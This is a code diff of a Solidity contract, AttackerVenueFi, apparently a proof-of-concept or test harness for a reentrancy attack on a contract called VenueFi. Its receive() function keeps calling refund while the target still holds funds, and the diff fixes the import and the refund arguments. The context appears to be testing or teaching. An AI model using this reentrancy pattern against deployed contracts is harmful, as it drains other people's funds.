@@ -1,6 +1,7 @@
+// AttackerVenueFi.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
-import "../venuFi.sol";
+import "../VenueFi.sol";
 
 contract AttackerVenueFi {
     VenueFi public target;
@@ -10,20 +11,18 @@ contract AttackerVenueFi {
         target = VenueFi(_target);
     }
 
-    // step 1: invest while still in FUNDING
     function doInvest() external payable {
         target.invest{value: msg.value}();
         attackAmount = msg.value;
     }
 
-    // step 2: after closeFunding, try to attack
     function attack() external {
-        target.refund();
+        target.refund(attackAmount);
     }
 
     receive() external payable {
         if (address(target).balance > 0) {
-            target.refund(); // try to re-enter
+            target.refund(attackAmount);
         }
     }
 }
